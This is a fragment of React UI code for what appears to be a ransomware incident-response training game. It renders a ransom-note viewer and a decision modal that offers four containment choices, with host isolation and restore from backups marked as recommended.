            backgroundColor: 'rgba(4, 7, 14, 0.88)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1600,
            padding: '24px'
          }}
        >
          <div
            className="cyber-panel"
            style={{
              width: '100%',
              maxWidth: '640px',
              backgroundColor: '#0a0d14',
              border: '2px solid var(--neon-red)',
              borderRadius: '6px',
              padding: '24px',
              boxShadow: '0 0 35px rgba(255, 51, 85, 0.35)'
            }}
          >
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <Lock size={18} color="var(--neon-red)" />
                <span style={{ fontFamily: 'var(--font-pixel)', fontSize: '11px', color: 'var(--neon-red)' }}>
                  README_RESTORE_FILES.txt (ATTACKER EXTORTION NOTE)
                </span>
              </div>
              <button
                onClick={() => setShowRansomNoteModal(false)}
                style={{ background: 'none', border: 'none', color: '#888', cursor: 'pointer' }}
              >
                <X size={16} />
              </button>
            </div>

            <pre
              style={{
                backgroundColor: '#05070c',
                border: '1px solid #1e2838',
                borderRadius: '4px',
                padding: '16px',
                fontSize: '11px',
                color: '#ffc5cc',
                lineHeight: '1.6',
                whiteSpace: 'pre-wrap',
                margin: '0 0 16px',
                fontFamily: 'var(--font-mono)'
              }}
            >
              {EDR_INCIDENT_DATA.ransomNoteText}
            </pre>

            <button
              onClick={() => setShowRansomNoteModal(false)}
              className="cyber-button"
              style={{ width: '100%', padding: '10px', fontSize: '11px' }}
            >
              CLOSE EXTORTION NOTE
            </button>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODAL 3: INCIDENT CONTAINMENT MATRIX (DECISION MODAL) */}
      {/* ========================================================================= */}
      {showDecisionModal && (
        <div
          style={{
            position: 'absolute',
            inset: 0,
            backgroundColor: 'rgba(5, 8, 15, 0.94)',
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            zIndex: 1700,
            padding: '24px'
          }}
        >
          <div
            className="cyber-panel"
            style={{
              width: '100%',
              maxWidth: '680px',
              backgroundColor: '#0c1322',
              border: '2px solid var(--neon-red)',
              borderRadius: '6px',
              padding: '28px',
              boxShadow: '0 0 40px rgba(255, 51, 85, 0.35)'
            }}
          >
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '16px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px' }}>
                <ShieldAlert size={22} color="var(--neon-red)" />
                <h3 style={{ fontFamily: 'var(--font-pixel)', fontSize: '13px', color: '#fff', margin: 0 }}>
                  INCIDENT CONTAINMENT DECISION MATRIX
                </h3>
              </div>
              <button
                onClick={() => { audioSystem.play('computer_click'); setShowDecisionModal(false); setPendingDecision(null); }}
                style={{ background: 'none', border: 'none', color: '#888', cursor: 'pointer' }}
              >
                <X size={16} />
              </button>
            </div>

            <p style={{ fontSize: '12px', lineHeight: '1.6', color: '#b5cde2', marginBottom: '20px' }}>
              The ransomware is actively beaconing to C2 (<code style={{ color: 'var(--neon-red)' }}>194.26.29.112:8443</code>) and scanning SMB port 445 on the backup vault. Select the incident response procedure to execute immediately:
            </p>

            <div style={{ display: 'flex', flexDirection: 'column', gap: '12px' }}>
              {/* Option 1: ISOLATE_HOST_AND_RESTORE */}
              <button
                onClick={() => { audioSystem.play('computer_click'); setPendingDecision('ISOLATE_HOST_AND_RESTORE'); }}
                className="cyber-button"
                style={{
                  padding: '14px 18px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  textAlign: 'left',
                  borderColor: pendingDecision === 'ISOLATE_HOST_AND_RESTORE' ? 'var(--neon-green)' : 'var(--cyan-bright)',
                  backgroundColor: pendingDecision === 'ISOLATE_HOST_AND_RESTORE' ? 'rgba(40, 230, 120, 0.15)' : '#0f1726'
                }}
              >
                <div>
                  <div style={{ fontSize: '12px', color: 'var(--neon-green)', fontWeight: 'bold' }}>
                    1. SEVER NIC (HOST ISOLATION) & ROLLBACK FROM IMMUTABLE SNAPSHOTS
                  </div>
                  <div style={{ fontSize: '11px', color: '#8fa4be', marginTop: '4px' }}>
                    Isolate host from production LAN, capture RAM forensics, kill malicious process tree, and restore from air-gapped backups.
                  </div>
                </div>
                <span style={{ fontSize: '10px', color: 'var(--neon-green)', flexShrink: 0, marginLeft: '12px' }}>
                  RECOMMENDED
                </span>
              </button>

              {/* Option 2: TERMINATE_POWERSHELL_ONLY */}
              <button
                onClick={() => { audioSystem.play('computer_click'); setPendingDecision('TERMINATE_POWERSHELL_ONLY'); }}
                className="cyber-button"
                style={{
                  padding: '14px 18px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  textAlign: 'left',
                  borderColor: pendingDecision === 'TERMINATE_POWERSHELL_ONLY' ? 'var(--neon-amber)' : '#1e2c40',
                  backgroundColor: pendingDecision === 'TERMINATE_POWERSHELL_ONLY' ? 'rgba(255, 170, 40, 0.15)' : '#0f1726'
                }}
              >
                <div>
                  <div style={{ fontSize: '12px', color: 'var(--neon-amber)', fontWeight: 'bold' }}>
                    2. KILL RUNNING POWERSHELL PROCESS ONLY
                  </div>
                  <div style={{ fontSize: '11px', color: '#8fa4be', marginTop: '4px' }}>
                    Terminate PID 8840 via task manager without isolating the network card or checking scheduled persistence tasks.
                  </div>
                </div>
              </button>

              {/* Option 3: REBOOT_SERVER */}
              <button
                onClick={() => { audioSystem.play('computer_click'); setPendingDecision('REBOOT_SERVER'); }}
                className="cyber-button"
                style={{
                  padding: '14px 18px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  textAlign: 'left',
                  borderColor: pendingDecision === 'REBOOT_SERVER' ? 'var(--neon-red)' : '#1e2c40',
                  backgroundColor: pendingDecision === 'REBOOT_SERVER' ? 'rgba(255, 51, 85, 0.15)' : '#0f1726'
                }}
              >
                <div>
                  <div style={{ fontSize: '12px', color: '#ff7588', fontWeight: 'bold' }}>
                    3. POWER-CYCLE / HARD REBOOT FILE SERVER
                  </div>
                  <div style={{ fontSize: '11px', color: '#8fa4be', marginTop: '4px' }}>
                    Force an immediate system restart to flush memory and kill running background processes.
                  </div>
                </div>
              </button>

              {/* Option 4: PAY_RANSOM_DEMAND */}
              <button
                onClick={() => { audioSystem.play('computer_click'); setPendingDecision('PAY_RANSOM_DEMAND'); }}
                className="cyber-button"
                style={{
                  padding: '14px 18px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  textAlign: 'left',
                  borderColor: pendingDecision === 'PAY_RANSOM_DEMAND' ? 'var(--neon-red)' : '#1e2c40',
                  backgroundColor: pendingDecision === 'PAY_RANSOM_DEMAND' ? 'rgba(255, 51, 85, 0.15)' : '#0f1726'
                }}
              >
                <div>
                  <div style={{ fontSize: '12px', color: 'var(--neon-red)', fontWeight: 'bold' }}>
                    4. PAY 5.0 BITCOIN RANSOM DEMAND TO ATTACKER WALLET
                  </div>
                  <div style={{ fontSize: '11px', color: '#8fa4be', marginTop: '4px' }}>
                    Transfer $300,000 corporate emergency funds in BTC to obtain syndicate decrypter utility.
                  </div>
                </div>
              </button>
            </div>

            {/* Confirmation Bar */}
            {pendingDecision && (
              <div
                style={{
                  marginTop: '18px',
                  padding: '12px 16px',
                  backgroundColor: 'rgba(255, 170, 40, 0.12)',
                  border: '1px solid var(--neon-amber)',
                  borderRadius: '4px',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'space-between',
                  gap: '12px'
                }}
              >
                <span style={{ fontSize: '11px', color: 'var(--neon-amber)', fontFamily: 'var(--font-mono)' }}>
                  ⚠ CONFIRM: <strong>{pendingDecision.replace(/_/g, ' ')}</strong> — This action is irreversible.
                </span>
                <div style={{ display: 'flex', gap: '8px', flexShrink: 0 }}>
                  <button
                    onClick={() => { audioSystem.play('computer_click'); setPendingDecision(null); }}
                    className="cyber-button"
                    style={{ padding: '6px 12px', fontSize: '10px', borderColor: 'var(--text-muted)', color: 'var(--text-muted)' }}
                  >
                    CANCEL
                  </button>
                  <button
                    onClick={() => handleChooseDecision(pendingDecision)}
                    className="cyber-button"
                    style={{ padding: '6px 14px', fontSize: '10px', borderColor: 'var(--neon-amber)', color: 'var(--neon-amber)' }}
                  >
                    EXECUTE
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
    </div>
  );
};
